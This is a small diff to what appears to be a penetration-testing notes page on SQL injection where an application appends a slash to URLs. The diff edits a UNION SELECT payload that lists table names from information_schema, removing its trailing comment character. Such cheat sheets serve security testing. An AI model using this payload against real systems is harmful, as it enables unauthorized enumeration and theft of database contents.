@@ -11,7 +11,7 @@ description: When the application, adds a / on the final of URL
 {% endcontent-ref %}
 
 ```
-union select 1,2,table_name,4,5 from information_schema.tables where table_schema=char(xxx,xxx,xxx,xxx) %23
+union select 1,2,table_name,4,5 from information_schema.tables where table_schema=char(xxx,xxx,xxx,xxx)
 ```
 
 **Note:** Change the xxx to the values ​​corresponding to the chars of the table name string
